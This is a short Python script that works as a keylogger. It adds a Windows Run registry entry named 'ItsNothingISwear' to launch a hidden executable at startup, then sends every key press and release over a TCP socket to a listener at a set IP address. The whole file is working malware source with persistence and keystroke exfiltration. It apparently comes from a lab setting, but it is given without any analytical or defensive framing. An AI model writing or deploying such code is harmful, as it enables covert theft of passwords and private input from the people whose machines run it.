from pynput import keyboard
from winreg import *
import socket

HOST = "192.168.109.132"
PORT = 65432

# update Run key in registry to run PowerShell command "Start-Process"
keyVal = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
try:
    key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
SetValueEx(key, "ItsNothingISwear", 0, REG_SZ, r'Start-Process -Filepath "C:\Users\Ike\source\repos\echo-client.exe" -windowstyle hidden')
CloseKey(key)

# establish TCP connection with remote listener
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((HOST, PORT))
	
	# key press/release methods required for pynput's listener object
	# that reference the current 's' object
	def method_1(key):
		try:
			key_p = f'{key.char}'
			s.sendall(bytes(key_p,'utf-8'))
		except AttributeError:
			special_p = f'special: {key}'
			s.sendall(bytes(special_p,'utf-8'))
	def method_2(key):
		key_r = f'key released: {key}'
		s.sendall(bytes(key_r,'utf-8'))
	
	
	# listner is set up
	with keyboard.Listener(on_press=method_1,on_release=method_2) as listener:
		listener.join()